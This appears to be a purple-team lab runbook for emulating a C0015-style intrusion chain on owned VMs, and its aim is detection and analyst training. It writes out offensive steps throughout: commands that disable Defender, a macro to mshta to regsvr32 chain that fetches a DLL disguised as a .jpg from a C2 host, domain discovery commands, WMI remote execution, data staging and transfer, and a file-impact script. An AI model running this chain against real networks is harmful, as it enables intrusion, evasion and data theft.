# C0015 Attack Runbook — step by step (S1 to S15)

Canonical, machine-by-machine runbook to reproduce the C0015-inspired chain on the lab.
All steps are benign surrogates on owned VMs. Read `docs/implementation-plan.md` (blueprint),
`docs/attack-chain-plan.md` (historical fidelity) and `docs/correlation-architecture.md`
(join keys) first. Supersedes the earlier phase-1-only runbook.

## Roles and machines

| Role | Machine | Notes |
|---|---|---|
| Victim / first foothold | WS01 (192.168.50.20, Win10, `C0015\duc.user`) | Word + Elastic Agent + Sysmon |
| Lateral target / file+backup | FS01 (192.168.50.30, Win10 Pro 19045) | shares Finance/IT |
| Attacker / C2 | host lab 192.168.50.1 (or Kali 192.168.50.100) | runs C2-SIM v2 + HTTP DLL server |
| Identity / telemetry | DC01 (192.168.50.10) | AD/DNS; not an attack target |
| SIEM | ELASTIC01 (Tailscale, Fleet 100.77.46.126:8220) | Elastic 9.5.3, namespace `c0015` |

## Prerequisites (once, before the first run)

1. WS01: Word installed (verify `HKLM:\...\App Paths\winword.exe`).
2. WS01 Word macros: enable VBA macros; enable "Trust access to the VBA project object model".
3. Sysmon: deploy the routine **BALANCED** profile, or the **CAPTURE** profile for bounded
   observation sessions (E7/E10 unfiltered). Files: `configs/sysmon/sysmon-c0015-balanced.xml`
   (routine) and `configs/sysmon/sysmon-c0015-capture.xml` (observation).
   ```powershell
   # from an admin PowerShell on the endpoint:
   & C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml     # routine
   # or for an observation session:
   & C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-capture.xml
   ```
4. Lab AV config (so the benign chain is not blocked): on WS01 and FS01, disable Defender
   real-time for the session (documented lab configuration, not evasion):
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -DisableIOAVProtection $true
   ```
   Re-enable after the run; record the disable as an observable (Defender Operational 5001/5010/1151).
5. Build toolchain on the attacker host: mingw (`apt install gcc-mingw-w64-x86-64` on Kali).
6. Pull the latest repo (`git pull`); HEAD should match what you are about to run.

## Part A — S1..S3: entry, bootstrap, beacon (VERIFIED)

### Attacker / C2 host

```powershell
cd <repo>
# 1. Build the benign DLL (masqueraded as .jpg -> T1036), staged into build/out/
./payloads/packaging/build_dll.sh                      # -> c0015-comparefor.jpg + build/out/

# 2. Generate the per-run config (C2Host = this host's lab IP)
mkdir -p stage/ws01
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-<yyyymmdd>-01 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
cp payloads/hta/bootstrap.hta payloads/beacon/c0015_beacon.ps1 stage/ws01/

# 3. Start C2-SIM (:8080) + HTTP DLL server (:8000). The script auto-kills stale listeners first.
pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
# verify: http://192.168.50.1:8000/c0015-comparefor.jpg -> 200
```

### WS01 (victim)

```powershell
# 4. Stage delivery files into C:\Users\Public\C0015\ (config.ini + bootstrap.hta + c0015_beacon.ps1)
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source <folder-with-config-hta-beacon>

# 5. Build the macro-enabled document
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba

# 6. Open test.docm ONCE (Enable Content). Chain: macro -> mshta -> HTA -> download DLL -> regsvr32 -> DLL -> beacon.
```

### Verify S1..S3 (session 1)

- C2-SIM log (`c2sim.log` on the C2 host) must show exactly ONE:
  `register stage=phase3 host=WS01 token=... ok=True (registered)`, followed by task/result lines.
  A duplicate open yields `ok=False (reuse:...)` (idempotent — one session per run).
- WS01 markers: `C:\Users\Public\C0015\b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`,
  `dll-executed.txt` (the last one proves the DLL executed; the HTA does not write it).
- Sysmon E1 on WS01: `WINWORD -> cmd -> mshta -> regsvr32 -> powershell` ancestry; E11 for the files;
  E3 to `192.168.50.1:8000/8080`; E7 ImageLoad of the DLL only if the CAPTURE profile is loaded.

## Part B — S4: discovery (operator, via C2-SIM task batch) — READY

The beacon executes the DFIR discovery batch on WS01 (parent chain = beacon). The operator only
drives it through the C2 channel. The C2-SIM serves these tasks once, in order, then idles:

`net view /all` (T1135) · `tasklist /s` (T1057) · `net group "domain admins" /dom` (T1069.002) ·
`net localgroup "administrator"` (T1069.001) · `nltest /domain_trusts /all_trusts` (T1482) ·
`net view /all /domain` (T1018) · `net view /all time` (T1124) · `ping FS01` (T1018).

- With session 1 active, the beacon loops through the batch automatically (config `loop_count=12`
  default). Watch `c2sim.log` for the 8 `task/next ... result ... ok=True` lines.
- Verify on WS01: Sysmon E1 for each command with parent = `powershell`/beacon.
- Record the observed outputs (esp. shares) — they feed S5.

## Part C — S5..S6: share artifact and target decision

```powershell
# S5 (on WS01, operator context): enumerate shares read-only -> found_shares artifact
net view \\FS01
Get-SmbShare | Out-File C:\ProgramData\found_shares.txt   # mirror DFIR staging path (LAB-SURROGATE)
# build ART-04-01 (structured discovery result) with lab_tools
python scripts/lab_tools.py artifact-new ART-04-01 <run_id> 5 6 --payload found_shares.json -o art04_01.json

# S6 (orchestrator on C2 host): READ ART-04-01 -> choose target -> ART-04-02
python scripts/lab_tools.py artifact-new ART-04-02 <run_id> 6 8 --payload target-manifest.json -o art04_02.json
```
`ART-04-02` must derive `target.host=FS01` from `ART-04-01` content (no hardcode); record the reason.

## Part D — S7..S8: auth context + WMI remote process (design; gate before running)

```powershell
# S7 auth controls (operator, explicit credential; ART-05-01 = evidence, not control input)
#   control A (denied):  duc.user -> FS01 denied
#   control B (allowed): it.admin -> FS01 allowed (net use with prompt, never log the password)
#   control C (revoked): revoked account -> denied
net use \\FS01\IPC$ /user:C0015\it.admin *     # prompt; password never in command line/log

# S8a tool handoff (T1570 surrogate): copy the DLL to FS01 admin share
copy C:\C0015\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\

# S8b WMI remote process creation with EXPLICIT credential (never the current token):
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
#   fallback (telemetry differs): $cred=Get-Credential C0015\it.admin ; Invoke-CimMethod Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred -Arguments @{CommandLine="rundll32.exe ..."}
```
Gate (4 questions, same run_id): process ran on FS01 (E1 wmiprvse->child); which identity
(S4648 on WS01 + S4624/4672 on FS01, matching LogonId); which process (rundll32 + DLL hash); and the
callback at S9. Identity proof = explicit-credential evidence, NOT the IPC$ session of S8a.

## Part E — S9: second session (143.dll surrogate)

The benign DLL on FS01 registers `phase7-session2` with the C2-SIM, which writes the server-side
receipt `ART-07-01` (see `scripts/c2sim_v2.py`). Acceptance = receipt + FS01 callback telemetry in the
same run. A marker or the DLL merely existing is NOT sufficient. Injection is NOT performed (S9b =
analysis/replay only, fixtures in `scripts/fixtures/`).

## Part F — S10..S11: collection, staging, transfer (two rounds with RDP between)

```powershell
# S10 (session 2 on FS01): read corpus, build ART-08-01 manifest with hashes/sizes
python scripts/lab_tools.py manifest-new C:\Shares\IT <run_id> -o art08_01.json

# S11a / S11b: transfer to internal sink (allowlist hash), two rounds; RDP (S12) between them
#   sink (C2 host): run the repo sink and cross-check
python scripts/lab_tools.py receipt-check <receipt.json> <manifest.json> <allowlist.json>
```
Keep the source-order (round 1 -> RDP day 2 -> round 2 day 4). Chunked <=512 B transfer is DESIGN ONLY
until the sink supports multi-chunk reassembly; current sink accepts a single allowlisted POST (<=1024 B).

## Part G — S12..S14: RDP, AnyDesk-like + LSASS study, bounded impact

```powershell
# S12 RDP (native): mstsc /v:FS01 as it.admin; capture 4624 Type 10 / 4778 / 4779 (DET-008 to define)

# S13 AnyDesk-like: install the legitimate portable app into an unusual path (e.g. C:\Users\Public\Videos\)
#     and capture install/process/network telemetry. LSASS access study = ANALYSIS/REPLAY ONLY:
#     a lab tool may open lsass.exe with PROCESS_QUERY_LIMITED_INFORMATION to produce E10 with access mask;
#     high-rights patterns only in synthetic fixtures. No dump, no read, no credential.

# S14 bounded impact (manifest-driven, allowlist corpus + restore):
powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Prepare
powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Run
powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Rollback
powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
```
Root is allowlisted per-run in the manifest; system roots / drive roots / reparse points are refused.

## Part H — S15: end-to-end (engineering + investigation)

Run the full chain twice under ONE `run_id` each: an engineering run (runbook visible) and an
investigation run (analyst sees only telemetry; ground truth hidden until reconstruction is done).
Score the analyst reconstruction against the run ledger with `python scripts/lab_tools.py score`.

## Cleanup (after each run)

```powershell
# C2 host: stop servers
pwsh -File payloads/packaging/launch_servers.ps1 -Stop
# WS01/FS01: remove chain artifacts
Remove-Item -Recurse -Force C:\Users\Public\C0015 ; Remove-Item "$env:USERPROFILE\Desktop\test.docm" -Force
# Re-enable Defender + restore routine Sysmon profile after the observation session.
```

Status: S1-S3 VERIFIED on lab; S4 READY (task batch prepared); S5-S15 are operator/design steps with
exact commands above; the chain is NOT end-to-end until one continuous run carries handoff evidence
for every stage under a single run_id.
